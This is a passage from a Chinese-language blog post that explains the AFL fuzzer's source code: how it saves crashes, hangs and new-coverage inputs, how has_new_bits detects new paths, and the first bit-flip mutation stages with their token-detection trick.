&#125;</span><br><span class="line"></span><br><span class="line">    queue_top-&gt;exec_cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Try to calibrate inline; this also calls update_bitmap_score() when</span></span><br><span class="line"><span class="comment">       successful. */</span></span><br><span class="line"></span><br><span class="line">    res = <span class="built_in">calibrate_case</span>(argv, queue_top, mem, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">    <span class="built_in">ck_write</span>(fd, mem, len, fn);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    keeping = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (fault) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_TMOUT:</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Timeouts are not very interesting, but we&#x27;re still obliged to keep</span></span><br><span class="line"><span class="comment">         a handful of samples. We use the presence of new bits in the</span></span><br><span class="line"><span class="comment">         hang-specific bitmap as a signal of uniqueness. In &quot;dumb&quot; mode, we</span></span><br><span class="line"><span class="comment">         just keep everything. */</span></span><br><span class="line"></span><br><span class="line">      total_tmouts++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (unique_hangs &gt;= KEEP_UNIQUE_HANG) <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line">        <span class="built_in">simplify_trace</span>((u64*)trace_bits);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="built_in">simplify_trace</span>((u32*)trace_bits);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__x86_64__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">has_new_bits</span>(virgin_tmout)) <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      unique_tmouts++;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Before saving, we make sure that it&#x27;s a genuine hang by re-running</span></span><br><span class="line"><span class="comment">         the target with a more generous timeout (unless the default timeout</span></span><br><span class="line"><span class="comment">         is already generous). */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (exec_tmout &lt; hang_tmout) &#123;</span><br><span class="line"></span><br><span class="line">        u8 new_fault;</span><br><span class="line">        <span class="built_in">write_to_testcase</span>(mem, len);</span><br><span class="line">        new_fault = <span class="built_in">run_target</span>(argv, hang_tmout);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* A corner case that one user reported bumping into: increasing the</span></span><br><span class="line"><span class="comment">           timeout actually uncovers a crash. Make sure we don&#x27;t discard it if</span></span><br><span class="line"><span class="comment">           so. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!stop_soon &amp;&amp; new_fault == FAULT_CRASH) <span class="keyword">goto</span> keep_as_crash;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stop_soon || new_fault != FAULT_TMOUT) <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line"></span><br><span class="line">      fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/hangs/id:%06llu,%s&quot;</span>, out_dir,</span><br><span class="line">                        unique_hangs, <span class="built_in">describe_op</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/hangs/id_%06llu&quot;</span>, out_dir,</span><br><span class="line">                        unique_hangs);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!SIMPLE_FILES */</span></span></span><br><span class="line"></span><br><span class="line">      unique_hangs++;</span><br><span class="line"></span><br><span class="line">      last_hang_time = <span class="built_in">get_cur_time</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_CRASH:</span><br><span class="line"></span><br><span class="line">keep_as_crash:</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* This is handled in a manner roughly similar to timeouts,</span></span><br><span class="line"><span class="comment">         except for slightly different limits and no need to re-run test</span></span><br><span class="line"><span class="comment">         cases. */</span></span><br><span class="line"></span><br><span class="line">      total_crashes++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (unique_crashes &gt;= KEEP_UNIQUE_CRASH) <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line">        <span class="built_in">simplify_trace</span>((u64*)trace_bits);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="built_in">simplify_trace</span>((u32*)trace_bits);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__x86_64__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">has_new_bits</span>(virgin_crash)) <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!unique_crashes) <span class="built_in">write_crash_readme</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line"></span><br><span class="line">      fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/crashes/id:%06llu,sig:%02u,%s&quot;</span>, out_dir,</span><br><span class="line">                        unique_crashes, kill_signal, <span class="built_in">describe_op</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/crashes/id_%06llu_%02u&quot;</span>, out_dir, unique_crashes,</span><br><span class="line">                        kill_signal);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!SIMPLE_FILES */</span></span></span><br><span class="line"></span><br><span class="line">      unique_crashes++;</span><br><span class="line"></span><br><span class="line">      last_crash_time = <span class="built_in">get_cur_time</span>();</span><br><span class="line">      last_crash_execs = total_execs;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_ERROR: <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we&#x27;re here, we apparently want to save the crash or hang</span></span><br><span class="line"><span class="comment">     test case, too. */</span></span><br><span class="line"></span><br><span class="line">  fd = <span class="built_in">open</span>(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">  <span class="built_in">ck_write</span>(fd, mem, len, fn);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这里是根据在调用目标程序执行变异之后的测试用例时所返回的结果分类进行分析的。</p><ol><li>返回的结果是<code>crash_mode</code> 。这里在<code>run_target</code> 中没有找到相应的返回结果的情况。这里我们找到crash_mode的赋值的位置只有当我们设置-C参数的时候，crash_mode会被赋值为<code>FAULT_CRASH</code> 。这里针对crash_mode的解释可以看参数处理部分。 这里如果返回的结果是crash_mode的话，首先会调用<code>has_new_bits</code> 函数来判断是否产生了新路径。这里再次复习一下产生新路径的判断方式就是trace_bits中是否有新的Bytes不为0。如果产生了新的路径，此时就会将这个测试用例加入到队列中，调用<code>calibrate_case</code> 函数来校准测试用例，最后将变异之后的样本写入到磁盘文件中，注意到这里写入到的磁盘文件是在<code>queue</code>也就是队列的目录下，会参与接下来的Fuzz。注意到这里的命名也是特殊设计的，其保留了当前测试用例得到的方式。</li><li>返回的结果是<code>FAULT_TMOUT</code>，也就是超时，这里如果是dump mode那么就会保存下来所有的测试用例。实际上这里的超时并不是那么受欢迎。但是这里还是去判断是否产生了新路径。没有产生新路径的话，那么这里就直接返回了。如果产生了新的路径，这里会再次执行一遍目标程序来保证是真正的超时，如果再次时候的时候返回的结果是CRASH，那么这里进入到crash的逻辑中进行处理。否则这里接下来就会将该测试用例写入到<code>hang</code>目录下。</li><li>返回的结果是<code>FAULT_CRASH</code>，也就是此时出现了Crash，如果不是<code>dumb_mode</code> 的话，那么这里还是会判断是否产生了新的路径，如果没有产生新的路径的话，这里直接返回了。否则这里将会将当前的测试用例保存到<code>crashes</code>目录下</li></ol><h2 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits"></a>has_new_bits</h2><p>这实际上是一个很重要的函数，用来判断在运行过程中是否产生了新的路径，是基于路径覆盖的指导变异的基础。关键部分的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(*current) &amp;&amp; <span class="built_in">unlikely</span>(*current &amp; *virgin)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">likely</span>(ret &lt; <span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        u8* cur = (u8*)current;</span><br><span class="line">        u8* vir = (u8*)virgin;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Looks like we have not found any new bytes yet; see if any non-zero</span></span><br><span class="line"><span class="comment">           bytes in current[] are pristine in virgin[]. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">4</span>] &amp;&amp; vir[<span class="number">4</span>] == <span class="number">0xff</span>) || (cur[<span class="number">5</span>] &amp;&amp; vir[<span class="number">5</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">6</span>] &amp;&amp; vir[<span class="number">6</span>] == <span class="number">0xff</span>) || (cur[<span class="number">7</span>] &amp;&amp; vir[<span class="number">7</span>] == <span class="number">0xff</span>)) ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>)) ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__x86_64__ */</span></span></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      *virgin &amp;= ~*current;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们看到<code>virgin</code> 表示的是运行之前的bitsmap，而current表示的则是运行之后的bitsmap。这里<code>==</code>操作符的优先级要高于<code>&amp;&amp;</code> 。也就是说ret=2的时候表示的是产生了新的路径。而ret=1则表示的是命令某一条路径的次数发生了变化。这里只要产生了新的路径就会立即返回，也就是说命中某一条路径的次数的变化的优先级要低于产生新的路径。</p><p>这里需要注意的是命中次数并不是我们平常理解的命中次数，而是存在一个桶的概念，只有命中次数从一个桶转换到另一个桶的时候才会认为是命中次数的变化。例如从<code>[32 ... 127]</code> 转换到<code>[128 ... 255]</code> 。</p><h1 id="变异策略"><a href="#变异策略" class="headerlink" title="变异策略"></a>变异策略</h1><p>通过前面的分析这里我们知道一共存在有六种变异策略。</p><ol><li>SIMPLE BITFLIP</li><li>ARITHMETIC INC/DEC</li><li>INTERESTING VALUES</li><li>DICTIONARY STUFF</li><li>RANDOM HAVOC</li><li>SPLICING</li></ol><p>这里我们依次进行一下分析</p><h2 id="SIMPLE-BITFLIP"><a href="#SIMPLE-BITFLIP" class="headerlink" title="SIMPLE BITFLIP"></a>SIMPLE BITFLIP</h2><p>从名称这里也可以看出来是一个简单的bit翻转，这里对bit翻转操作的定义如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line"><span class="meta">    u8* _arf = (u8*)(_ar); \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b); \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>这里传入的第一个参数是out_buf也就是要变异的测试用例文件内容，而第二个参数传入的是<code>stage_cur</code> 也就是当前变异的轮数，该值从0增涨到特定的长度。我们看到这里实际上每一次变异都是以8bit也就是以一个bit为单位的。</p><p>实际上这里在执行SIMPLE BITFLIP变异的时候这里并不只是执行一次FLIP_BIT函数，而是分为好几轮。</p><h3 id="bitflip-1-1"><a href="#bitflip-1-1" class="headerlink" title="bitflip 1/1"></a>bitflip 1/1</h3><ul><li><p>bitflip 1/1这一部分的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Single walking bit. */</span></span><br><span class="line"></span><br><span class="line">stage_short = <span class="string">&quot;flip1&quot;</span>;</span><br><span class="line">stage_max   = len &lt;&lt; <span class="number">3</span>;</span><br><span class="line">stage_name  = <span class="string">&quot;bitflip 1/1&quot;</span>;</span><br><span class="line"></span><br><span class="line">stage_val_type = STAGE_VAL_NONE;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">prev_cksum = queue_cur-&gt;exec_cksum;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While flipping the least significant bit in every byte, pull of an extra</span></span><br><span class="line"><span class="comment">     trick to detect possible syntax tokens. In essence, the idea is that if</span></span><br><span class="line"><span class="comment">     you have a binary blob like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     xxxxxxxxIHDRxxxxxxxx</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     ...and changing the leading and trailing bytes causes variable or no</span></span><br><span class="line"><span class="comment">     changes in program flow, but touching any character in the &quot;IHDR&quot; string</span></span><br><span class="line"><span class="comment">     always produces the same, distinctive path, it&#x27;s highly likely that</span></span><br><span class="line"><span class="comment">     &quot;IHDR&quot; is an atomically-checked magic value of special significance to</span></span><br><span class="line"><span class="comment">     the fuzzed format.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We do this here, rather than as a separate stage, because it&#x27;s a nice</span></span><br><span class="line"><span class="comment">     way to keep the operation approximately &quot;free&quot; (i.e., no extra execs).</span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">     Empirically, performing the check when flipping the least significant bit</span></span><br><span class="line"><span class="comment">     is advantageous, compared to doing it at the time of more disruptive</span></span><br><span class="line"><span class="comment">     changes, where the program flow may be affected in more violent ways.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The caveat is that we won&#x27;t generate dictionaries in the -d mode or -S</span></span><br><span class="line"><span class="comment">     mode - but that&#x27;s probably a fair trade-off.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     This won&#x27;t work particularly well with paths that exhibit variable</span></span><br><span class="line"><span class="comment">     behavior, but fails gracefully, so we&#x27;ll carry out the checks anyway.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u32 cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If at end of file and we are still collecting a string, grab the</span></span><br><span class="line"><span class="comment">         final character and force output. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">      a_len++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">        <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Otherwise, if the checksum has changed, see if we have something</span></span><br><span class="line"><span class="comment">         worthwhile queued up, and collect that if the answer is yes. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">        <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">      a_len = <span class="number">0</span>;</span><br><span class="line">      prev_cksum = cksum;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Continue collecting string, but only if the bit flip actually made</span></span><br><span class="line"><span class="comment">       any difference - we don&#x27;t want no-op tokens. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];        </span><br><span class="line">      a_len++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP1]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP1] += stage_max;</span><br></pre></td></tr></table></figure></li></ul><p>这一部分的主要作用实际上是分析Token，例如固定文件结构前面的magic number。因为我们知道如果目标程序只处理特定类型的文件的话，那么在处理之前就会首先去判断文件开始的magic number以确定文件的类型。如果在Fuzz过程中magic number被改变，那么相较于magic number正确的情况就会产生比较大的路径变化，并且由于magic number一般为四字节，因此这里改变前四个字节中的任意一个实际上最后得到的路径信息都是相同的。因此这里通过前期的bit翻转来确定某些Token以改进AFL对固定结构的Fuzz效果。</p><p>这里如果对一个文件来说我们知道其固定字节的长度不超过4字节，那么这里我们就可以更改MAX_AUTO_EXTRA全局变量，不过这就需要重新编译AFL。</p><p>这里每次变异结束之后都会进行一个复原，至于上面说的路径信息的比对则是在每8次翻转之后才进行一个操作。也就是这里对每一个字节的最低bit位进行翻转的结果进行一个判断。如果得到的路径信息和之前的checksum不同，并且接下来连续的几个字节的bit翻转之后的路径信息相同，那么就将这几个字节加入到字典中。</p><h3 id="bitflip-2-1"><a href="#bitflip-2-1" class="headerlink" title="bitflip 2/1"></a>bitflip 2/1</h3><ul><li><p>bitflip 2/1这一部分的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Two walking bits. */</span></span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;bitflip 2/1&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip2&quot;</span>;</span><br><span class="line">stage_max   = (len &lt;&lt; <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP2]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP2] += stage_max;</span><br></pre></td></tr></table></figure></li></ul><p>从这里我们其实可以看到，这次是每次翻转2bit，步长是1bit。也就是这里开始进入到了真正的bit翻转的变异过程。</p><h3 id="bitflip-4-1"><a href="#bitflip-4-1" class="headerlink" title="bitflip 4/1"></a>bitflip 4/1</h3><ul><li><p>bitflip 4/1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Four walking bits. */</span></span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;bitflip 4/1&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip4&quot;</span>;</span><br><span class="line">stage_max   = (len &lt;&lt; <span class="number">3</span>) - <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">3</span>);</span><br><span 